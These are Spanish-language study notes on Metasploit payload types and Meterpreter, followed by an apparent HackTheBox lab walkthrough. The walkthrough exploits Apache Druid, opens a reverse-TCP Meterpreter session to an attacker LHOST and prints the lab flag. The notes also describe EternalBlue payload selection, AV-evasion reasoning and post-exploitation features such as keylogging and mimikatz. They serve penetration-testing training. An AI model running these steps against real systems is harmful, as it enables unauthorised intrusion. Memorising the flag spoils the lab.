Un Payload es el código que se ejecuta en la máquina víctima tras explotarla. 

Existen tres tipos, los:
- Singles: son payloads que vienen en un solo bloque y contienen todo el código necesario para explotar el sistema.
	- Al ser todo en un bloque suelen ser más estables y menos propensos a errores. 
	- Ventajas:
		- Fáciles de usar
		- Estables
		- No dependen de múltiples etapas
	- Desventajas: 
		- El tamaño puede suponer un problema debido a que según que exploits, la cantidad de código que estos aceptan es más limitada.
- Stagers: su función principal es establecer la conexión entre atacante y víctima. Preparan la conexión para que la máquina víctima pueda comunicarse con la atacante. Además, son bastantes pequeños (ligeros). Cuando están listos se descargan los stages con funcionalidades avanzadas.
- Stages: es la 2a parte del proceso de los stagers. Son los que contienen las funcionalidades más concretas, como ahora: 
	- un interpreter del tipo meterpreter
	- herramientas de postexplotación.
	Es la etapa que nos da el control total sobre la máquina. 


## Staged Payloads
Un staged payload es un exploit modular: varias etapas pequeñas y separadas que, encadenadas, conceden acceso remoto al equipo objetivo.
- Objetivo: además de abrir una shell remota, ser lo más compacto y discreto posible para evadir AV/IPS.
- Stage0: es el shellcode inicial enviado al servicio vulnerable; su única misión es establecer la conexión de retorno (reverse) hacia el atacante.
- Tipos comunes de conexión: reverse_tcp, reverse_https (conexiones inversas) y bind_tcp (el objetivo abre un puerto y escucha).


Algunos ejemplos de Staged Payloads:
```shell-session
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
Windows x64 Reverse HTTPS Stager (winhttp)

<SNIP>
```

- Las conexiones "reverse" son menos propensas a activar sistemas de prevención debido a que esta conexión se inicia desde la parte de la víctima. 
- El stage0 es la primera parte del payload que se envia para establecer la conexión (primer pasito). 
	- Los stagers son el conjunto de módulos que inician la conexión (establecen la totalidad de la conexión).
- Stage 1 es la siguiente parte del payload que se descarga después del stage0. Sirve para establecer todas las funcionalidades avanzadas. Es el que me permite realmente interactuar con el sistema. 



## Meterpreter
Meterpreter es un payload avanzado que se ejecuta enteramente en la memoria del equipo comprometido —a menudo mediante inyección en procesos—, lo que dificulta su detección y deja pocas huellas en disco. Una vez cargado crea una sesión interactiva tipo msfconsole orientada al objetivo, desde la que pueden activarse múltiples funciones (captura de teclas, volcado de hashes, grabación de micrófono, capturas de pantalla, suplantación de tokens, etc.) y cargar o descargar plugins y scripts según se necesite. Su diseño le permite ser más sigiloso y flexible que un shell estándar, y por eso se utiliza frecuentemente en evaluaciones de seguridad y operaciones de post-explotación.

Haciendo un:
``` 
grep meterpreter show payloads"
``` 
 observamos un conjunto de Payloads que establecen una sesión meterpreter completa:
 
```shell-session
  515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
   531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   534  windows/x64/meterpreter_reverse_tcp    
```

  Puedo encadenar "greps" para hacer búsquedas más precisas: 
```
grep meterpreter grep reverse_tcp show payloads
```

Por ejemplo, puedo encadenar: 
```
search eternalblue
use 0
grep meterpreter grep reverse_tcp show payloads
```
Usando el módulo eternalblue (msf exploit(windows/smb/ms17_010_eternalblue) podemos ver varios payloads diferentes que puede utilizar dicho módulo:
```
msf exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```
Nos devuelve la salida:
```shell-session
 15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
```

Y finalmente: 
```
set payload 15
```

Con esto, lo que estoy haciendo es:
- Elegir el payload qué se ejecutará en la víctima (p. ej. Meterpreter vs shell) y qué arquitectura (x86/x64).
- También determina cómo se conecta (reverse vs bind) y si usa cifrado/otras variantes (rc4, uuid).
- Escoge según la arquitectura del objetivo, la topología de red (NAT/firewall) y la funcionalidad/detección que necesites.

Después de seleccionar un payload, tenemos muchas otras opciones a consultar (ver código de debajo):
Como podemos ver, al ejecutar el comando "show payloads" dentro del módulo Exploit, msfconsole ha detectado que el objetivo es una máquina Windows, por lo que solo muestra las cargas útiles dirigidas a sistemas operativos Windows.

También vemos que ha aparecido un nuevo campo de opción, directamente relacionado con el contenido de los parámetros de la carga útil. Nos centraremos en LHOST y LPORT (la IP de nuestro atacante y el puerto deseado para la inicialización de la conexión inversa). Por supuesto, si el ataque falla, siempre podemos usar un puerto diferente y reiniciarlo.
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

---
Cuando se selecciona un módulo (Eternalblue por ejemplo), al hacer "show options vemos" el siguiente contenido:
```
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

Observamos que por defecto se presecciona ya un payload: "windows/x64/meterpreter/reverse_tcp". 
Podrías listar todos los payloads compatibles con este módulo con:
```
msf exploit(windows/smb/ms17_010_eternalblue) > show payloads
```

Dando como salida:
```

Compatible Payloads
===================

   #   Name                                                Disclosure Date  Rank    Check  Description
   -   ----                                                ---------------  ----    -----  -----------
   0   payload/generic/custom                              .                normal  No     Custom Payload
   1   payload/generic/shell_bind_aws_ssm                  .                normal  No     Command Shell, Bind SSM (via AWS API)
   2   payload/generic/shell_bind_tcp                      .                normal  No     Generic Command Shell, Bind TCP Inline
   3   payload/generic/shell_reverse_tcp                   .                normal  No     Generic Command Shell, Reverse TCP Inline                   <-    este es el preseleccionado
   ...
   30  payload/windows/x64/meterpreter/reverse_https       .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   31  payload/windows/x64/meterpreter/reverse_named_pipe  .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   32  payload/windows/x64/meterpreter/reverse_tcp         .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   33  payload/windows/x64/meterpreter/reverse_tcp_rc4     .                normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   34  payload/windows/x64/meterpreter/reverse_tcp_uuid    .                normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   35  payload/windows/x64/meterpreter/reverse_winhttp     .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   36  payload/windows/x64/meterpreter/reverse_winhttps    .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   ...
   74  payload/windows/x64/vncinject/reverse_winhttps      .                normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)

```

La salida tras ejecutar un "run" dependerá del payload escogido.+

#### ¿Qué cambia según la selección?

- Tipo de sesión / prompt
	- Meterpreter → prompt meterpreter> y un conjunto rico de comandos propios (ps, download, screenshot, getuid, migrate, load mimikatz, etc.).
	- Reverse shell / bind shell (cmd/sh) → te deja en la shell del sistema (C:\Users> en Windows, $ en Linux). Comandos nativos del SO (whoami, dir, ls, etc.).

- Modo de entrega
	 - Staged (stager + stage) → verás en la salida mensajes tipo Started reverse TCP handler... y luego Sending stage (201283 bytes) antes de que se abra la sesión. Es modular: primero un pequeño stager, luego se descarga el stage grande (Meterpreter, VNC, etc.).
	 - Single (inline) → se envía todo en un único bloque; la salida no mostrará “sending stage” grande, simplemente la sesión se abre de forma directa (si el exploit soporta el tamaño).
- Transporte
	- reverse_tcp / reverse_http / reverse_https → la víctima conecta de vuelta al atacante (menos ruido en firewalls internos).
	- bind_tcp / bind_ipv6 / named_pipe → la víctima abre un puerto y el atacante se conecta a él.
- Funcionalidad / capacidades
	- Meterpreter / vncinject / powershell ≫ capacidades avanzadas de post-explotación (keystroke, webcam, persistencia, carga de plugins).
	- shell / exec ≫ acceso limitado a comandos del SO, más simple y directo.
- Tamaño / fiabilidad / detección
		- Singles suelen ser más grandes → pueden romper exploits que tienen límite de tamaño o activar AV si son pesados.
		- Staged más pequeños inicialmente → mejor para evitar restricciones y para descargar código más grande sólo si la conexión se establece.


**Ejemplo de como se ven por consola:

```
- **Staged Meterpreter (windows/x64/meterpreter/reverse_tcp)**
    - `[*] Started reverse TCP handler on LHOST:LPORT`
    - `[*] Sending stage (201283 bytes) to <IP>`
    - `[*] Meterpreter session 1 opened ...`
    - prompt: `meterpreter >`
        
- **Single reverse shell (windows/x64/shell_reverse_tcp inline)**
    - `[*] Started reverse TCP handler on LHOST:LPORT` 
    - (no “Sending stage (size)”)
    - `[*] Command shell session 1 opened ...` 
    - prompt: `C:\Users>`
```


----
**1. Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.**

Haciendo un escaneo básico en nmap me muestra lo que podía intuir con el enunciado del ejercicio:
existe un servicio "Apache Druid" corriendo sobre el puerto 80.

Abro msfconsole y ejecuto:
```
search druid
```

Y selecciono el siguiente: 
```
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce)
```

Seteo el RHOST (dato del enunciado), y el LHOST (consultado con "ip a").
Importante: el LHOST (máquina atacante) tiene que tener una IP en el rango de la IP de la máquina víctima. 
```
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set RHOST 10.129.107.142
RHOST => 10.129.107.142
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set LHOST 10.10.15.167
LHOST => 10.10.15.167
[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
```
Cuando tengamos la sesión de meterpreter, ejecutamos:
```
shell            (para que nos devuelva una consola interactiva)
cd               (para ir al directorio por defecto)
ls               (acaba mostrando que existe en dicho directorio la "flag.txt")
cat flag.txt
```

Siendo la respuesta: "HTB{MSF_Expl01t4t10n}".


